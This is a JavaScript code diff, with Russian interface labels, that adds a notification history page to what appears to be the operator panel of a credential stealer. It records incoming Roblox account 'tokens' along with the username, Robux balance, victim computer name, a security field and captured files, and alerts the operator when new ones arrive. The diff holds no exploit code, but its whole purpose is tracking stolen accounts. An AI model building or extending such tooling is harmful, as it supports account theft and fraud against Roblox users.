@@ -159,10 +159,44 @@ function formatAccountLoginStatus(lastLoginTs) {
   }
 }
 
+// ── Сохранение уведомления в локальную историю ───────────────────────────────
+function saveNotificationToHistory(info) {
+  try {
+    const history = JSON.parse(localStorage.getItem('ft_notifications_history') || '[]');
+    const statusInfo = formatAccountLoginStatus(info.lastLogin);
+    
+    const record = {
+      id: info.id || ('notif_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6)),
+      username: info.username || 'Roblox User',
+      userId: info.userId || null,
+      robux: Number(info.robux) || 0,
+      computer: info.computer || 'Unknown PC',
+      security: info.security || null,
+      file: info.file || null,
+      lastLogin: info.lastLogin || null,
+      isNew: statusInfo.isNew,
+      statusText: statusInfo.text,
+      receivedAt: Date.now()
+    };
+
+    const isDuplicate = history.some(h => 
+      (h.username === record.username || (h.userId && h.userId === record.userId)) 
+      && Math.abs(h.receivedAt - record.receivedAt) < 30000
+    );
+
+    if (!isDuplicate) {
+      history.unshift(record);
+      if (history.length > 200) history.pop();
+      localStorage.setItem('ft_notifications_history', JSON.stringify(history));
+    }
+  } catch (e) {}
+}
+
 // ── Визуальное уведомление о токене ───────────────────────────────────────────
 function showTokenNotification(info) {
   if (!info) return;
   playNotificationSound();
+  saveNotificationToHistory(info);
 
   let container = document.getElementById('tokenNotificationContainer');
   if (!container) {
@@ -263,6 +297,8 @@ async function checkNewTokensBackground() {
             userId: t.userId,
             robux: t.robux,
             computer: t.computer,
+            file: t.file,
+            security: t.security,
             lastLogin: lastLogin
           });
         }
@@ -334,6 +370,7 @@ function renderHeader(activePage) {
 
   const iconDashboard = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"></rect><rect x="14" y="3" width="7" height="5"></rect><rect x="14" y="12" width="7" height="9"></rect><rect x="3" y="16" width="7" height="5"></rect></svg>`;
   const iconTokens = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>`;
+  const iconBell = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>`;
   const iconChat = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>`;
   const iconUpdates = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>`;
   const iconSettings = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>`;
@@ -345,6 +382,7 @@ function renderHeader(activePage) {
     <div class="nav-links">
       ${navLink('files', 'index.html', iconDashboard, 'Файлы')}
       ${navLink('tokens', 'tokens.html', iconTokens, 'Токены')}
+      ${navLink('notifications', 'notifications.html', iconBell, 'Уведомления')}
       ${navLink('chat', 'chat.html', iconChat, 'Чат')}
       ${navLink('updates', 'updates.html', iconUpdates, 'Обновления')}
       ${navLink('settings', 'settings.html', iconSettings, 'Настройки', 'desktop-only')}
